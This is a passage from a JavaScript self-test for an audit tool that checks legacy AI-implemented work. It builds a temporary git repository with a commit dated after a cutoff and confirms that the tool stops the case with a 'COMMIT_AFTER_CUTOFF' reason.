  git(lateRepoDirRaw, ['commit', '-q', '-m', 'base']);
  git(lateRepoDirRaw, ['branch', '-m', 'main']);
  const lateRepoDir = fs.realpathSync(lateRepoDirRaw);
  const lateBaseHead = git(lateRepoDir, ['rev-parse', 'HEAD']).trim().toLowerCase();
  const lateBranch = 'feat/legacy-too-late';
  git(lateRepoDir, ['checkout', '-q', '-b', lateBranch]);
  git(lateRepoDir, ['remote', 'add', 'origin', 'https://github.com/acme/widgets.git']);
  fs.writeFileSync(path.join(lateRepoDir, 'src.txt'), 'after cutoff\n', 'utf8');
  git(lateRepoDir, ['add', '-A']);
  const lateCommitDate = '2026-10-01T00:00:00+00:00';
  git(lateRepoDir, ['commit', '-q', '-m', 'post-cutoff work'], { GIT_COMMITTER_DATE: lateCommitDate, GIT_AUTHOR_DATE: lateCommitDate });
  const lateExpectedHead = git(lateRepoDir, ['rev-parse', 'HEAD']).trim().toLowerCase();
  const latePayload = {
    schemaVersion: 1,
    taskId: 'legacy-late',
    repoRoot: lateRepoDir,
    branch: lateBranch,
    expectedHead: lateExpectedHead,
    baseHead: lateBaseHead,
    repository: { owner: 'acme', name: 'widgets' },
    allowedScope: ['src.txt'],
    implementationWindow: validWindow,
    legacyReason: 'NORMAL_ENTRY_MISSED_BEFORE_ENFORCEMENT',
    implementationAI: 'claude-cli',
    claudeEvidenceFiles: [path.join(tempRoot, 'unused-evidence.jsonl')],
    currentHeadVerifications: {
      testGate: { status: 'PASS', head: lateExpectedHead },
      canonicalContract: { status: 'PASS', head: lateExpectedHead },
      humanDecisionSync: { status: 'PASS', head: lateExpectedHead },
      finalRealityCheck: { status: 'PASS', head: lateExpectedHead },
    },
  };
  stopCase(latePayload, 'COMMIT_AFTER_CUTOFF', 'post-cutoff commit / new-work ineligibility');

  console.log('legacy-implementation-audit selftest: PASS');
} finally {
  fs.rmSync(tempRoot, { recursive: true, force: true });
}
